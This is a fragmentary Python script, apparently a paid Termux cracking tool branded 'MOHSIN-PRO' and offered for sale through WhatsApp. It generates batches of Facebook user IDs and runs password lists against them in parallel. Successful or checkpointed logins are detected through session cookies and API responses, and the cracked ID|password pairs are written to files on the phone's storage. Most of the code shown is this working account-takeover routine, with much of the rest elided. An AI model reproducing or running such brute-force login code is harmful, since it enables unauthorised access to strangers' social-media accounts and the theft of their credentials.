...
----------------------------------------------
 ...
 Github    : MOHSIN 110
 Facebook  : MOHSIN .
 Tool Name : MOHSIN -PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 MOHSIN  Pro version 3.2.1
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-openhttps://chat.whatsapp.com/HTKsJexrFa8AIZX7wvrMQo');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923465228754&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi MOHSIN  Sir, I Need To Buy Your Paid MOHSIN  PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", "https://github.com/mohsin09114/Trick/blob/main/File.txt"])
                        print(' Run :  python MOHSIN .py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as MOHSIN :     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                MOHSIN .submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MOHSIN -XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        MOHSIN =session.cookies.get_dict().keys()
                        if "c_user" in MOHSIN :
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [MOHSIN -OK] %s | %s'%(ids,pas))
                                open('/sdcard/MOHSIN -OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MOHSIN :
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MOHSIN -CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MOHSIN -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MOHSIN -OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MOHSIN -OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MOHSIN -OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MOHSIN -OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MOHSIN -OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MOHSIN -OK] '+uid+' | '+pas+'\033[1;97m')
